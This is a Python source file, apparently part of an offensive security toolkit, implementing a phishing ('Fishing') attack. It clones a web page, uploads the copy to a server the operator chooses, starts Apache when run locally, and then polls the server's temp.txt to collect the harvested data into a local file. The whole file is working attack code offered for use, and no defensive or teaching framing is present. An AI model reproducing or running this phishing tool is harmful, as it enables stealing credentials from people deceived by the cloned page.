import os
import time

import requests

import modules.Attack.cloning as clone
import utils.utils as include
from Setup.setup import commands


class Fishing:

    def __str__(self):
        return 'Fishing attack'

    @staticmethod
    def run():
        fish()


def fish():
    """
    Fishing attack
    :return: void
    """

    # Deal with the output file
    slash = include.command(commands, 'slash')
    output_file = str(input("output file: "))
    directory = "data%sFishing" % slash
    file_name = directory + slash + output_file
    # Checks on the existence and craeation if necessary
    if not os.path.isdir(directory):
        os.system('mkdir %s' % directory)
    file_name = include.if_exists(file_name)

    # Clone the page and do the necessary edits
    page = clone.clone()

    # Host server
    host = str(input('Host server (localhost or local IP for the IP of your machine): '))

    local_address = include.get_ip()[1]

    files = {'file': open(page)}
    port = 80
    version = ""
    if host == 'localhost' or host == local_address:

        f = open('Setup%sserver.config' % slash, 'r')
        for line in f:
            if '#' not in line:
                if 'MAMP' in line:
                    version = 'MAMP'
                elif 'XAMPP' in line:
                    version = 'XAMPP'
                elif 'Linux' in line:
                    version = 'linux'
                elif 'port' in line:
                    port = int(line.split(' ')[2])

        if version == 'linux':
            ret = os.system('sudo service apache2 start')
            if ret != 0:
                print("[-] Cannot start the apache server.")
                print("[-] Exiting the attack")
                return

        try:
            requests.post("%s:%d%sindex.php" % (host, port, slash), files=files)
        except Exception as e:
            print(e)
            print('[-] Unable to send the cloned page to the server')
            print('[-] Exiting the attack')
            time.sleep(5)
            return

    else:
        try:
            requests.post("http://" + host + "/index.php", files=files)
        except Exception as e:
            print(e)
            print('[-] Unable to send the cloned page to the server')
            print('[-] Exiting the attack')
            time.sleep(5)

    print("[+] File sent to the server")
    target_url = host + slash + "temp.txt"
    while 1:
        try:
            print("[*] Listening on http//%s ...." % host)
            data = requests.get(target_url)
            if data.status_code == 200:
                with open(file_name, 'w') as f:
                    f.write(data.text)
            break
        except Exception as e:
            print(e)
            time.sleep(5)
    if not data.content:
        print("[-] Unable to recieve the data")
        print("[-] Exiting the attack")
        return
    print("[+] Data reveived")

    print('[+] Fishing completed, the file is stored as:  %s' % file_name)
    if version == 'Linux':
        os.system('sudo service apache2 stop')
